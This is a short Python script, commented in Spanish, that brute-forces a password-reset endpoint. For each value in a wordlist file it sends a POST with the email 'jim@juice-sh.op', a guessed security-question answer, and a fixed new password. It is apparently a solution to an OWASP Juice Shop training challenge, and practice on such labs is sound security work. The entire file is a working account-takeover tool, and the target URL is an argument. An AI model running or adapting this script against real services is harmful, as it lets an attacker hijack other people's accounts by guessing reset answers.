import requests
import argparse

def inyectar_fuerza_bruta(url, valores):
  """
  Realiza una inyección por fuerza bruta enviando una petición POST
  para cada valor presente en la lista 'valores'.

  Parámetros:
    url (str): URL del endpoint al que se enviará el POST.
    valores (list): Lista de valores a inyectar en 'answer'.
  """
  for idx, valor in enumerate(valores, 1):
    datos = {
      "email": "jim@juice-sh.op",
      "answer": valor,      # Valor inyectado desde el archivo de texto
      "new": "34erdfCV.",
      "repeat": "34erdfCV."
    }
    try:
      respuesta = requests.post(url, json=datos)
      print(f"Inyección {idx}: Valor '{valor}' -> Código HTTP {respuesta.status_code}")
    except Exception as e:
      print(f"Error en inyección {idx} (valor '{valor}'): {e}")

def cargar_valores_desde_archivo(ruta_archivo):
  """
  Lee un archivo de texto y retorna una lista de valores, 
  eliminando saltos de línea y espacios en blanco.
  
  Parámetro:
    ruta_archivo (str): Ruta al archivo de texto.
  """
  try:
    with open(ruta_archivo, 'r', encoding='utf-8') as f:
      valores = [line.strip() for line in f if line.strip()]
    return valores
  except Exception as e:
    print(f"Error al leer el archivo {ruta_archivo}: {e}")
    return []

if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    description="Script para inyectar valores por fuerza bruta desde un archivo de texto."
  )
  parser.add_argument(
    "url", 
    help="URL del endpoint al que se enviarán las peticiones POST."
  )
  parser.add_argument(
    "archivo", 
    help="Ruta al archivo de texto con los valores a inyectar."
  )
  args = parser.parse_args()

  valores_inyeccion = cargar_valores_desde_archivo(args.archivo)
  if not valores_inyeccion:
    print("No se encontraron valores para inyectar.")
  else:
    inyectar_fuerza_bruta(args.url, valores_inyeccion)
